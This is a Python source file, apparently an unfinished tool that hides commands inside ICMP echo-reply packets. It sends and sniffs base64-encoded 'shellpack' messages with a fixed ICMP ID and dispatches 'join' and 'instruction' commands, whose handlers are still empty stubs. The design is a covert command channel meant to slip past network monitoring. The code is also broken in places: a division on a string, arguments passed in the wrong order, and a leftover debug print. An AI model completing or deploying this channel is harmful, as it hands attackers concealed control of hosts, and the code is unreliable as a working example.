from scapy.all import sr,IP,ICMP,Raw,sniff
import os
import socket
import psutil
import pwd
import ast
import base64

TTL = int(64)
ICMP_ID = int(12800)
MAX_DATA_SIZE = 1000

class Host:
    def __init__(self):
        self.ip = get_local_ip()
        self.iface = get_iface(self.ip)

    def __str__(self) -> str:
        report =  f"[ Host Information ]\n"
        report += f" -- IP: {self.ip}\n"
        report += f" -- Interface: {self.iface}\n"

        return report

    def sniff_callback(self, packet):
        # Parses out things that shouldn't be there

        if packet[ICMP].type != 0:
            return
        elif packet[IP].src == self.ip:
            return
        elif packet[ICMP].id != ICMP_ID:
            return
        elif not packet[Raw].load:
            return

        encoded_shellpack = (packet[Raw].load).decode('utf-8', errors='ignore')
        shellpack = base64.b64decode(encoded_shellpack).decode()
        unpacked = ast.literal_eval(shellpack)
        
        unpacked['ip'] = packet[IP].src

        # print(f" $ {unpacked['command']} received from {unpacked['ip']}")

        match unpacked['command']:
            case "join":
                self.join(unpacked)
            case "instruction":
                self.instruction(unpacked)
            case _:
                return
        
    def join(self, shellpack):
        pass

    def instruction(self, shellpack):
        pass
            
    def build_shellpacks(self, command: str, option: str | None = None, data: str | None = None) -> list[dict]:
        shellpacks = []

        shellpack = {
            "command": command,
            "option": option,
            "data" : data
            }

        encoded_shellpack = str(shellpack).encode()
        encoded_shellpack = base64.b64encode(encoded_shellpack)

        shellpack_length = len(encoded_shellpack)

        if shellpack_length > MAX_DATA_SIZE:
            print("asdasdasd")
            num_shellpacks = ( data // ( MAX_DATA_SIZE - ( shellpack_length - len(data) ) ) )
            print(num_shellpacks)

            # for i in range(num_shellpacks):
            #     shellpack['data'] = data[:len(shellpack//num_shellpacks)]
        else:
            shellpacks = [encoded_shellpack]

        return shellpacks

    def send(self, ip, command: str, data: str | None = None, option: str | None = None) -> bool:
        shellpacks = self.build_shellpacks(command, data)

        for shellpack in shellpacks:
            data = (IP(dst=ip, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load=shellpack))
            sr(data, timeout=0, verbose=0)
            # print(f" $ {command} sent to {ip} > {message}")

def get_iface(ip) -> str:
    nics = psutil.net_if_addrs()
    iface = [i for i in nics for j in nics[i] if j.address==ip and j.family==socket.AF_INET][0]
    return iface
    
def get_local_ip() -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
    try:
        s.connect(("192.255.255.255", 1))
        ip = s.getsockname()[0]
    except:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip
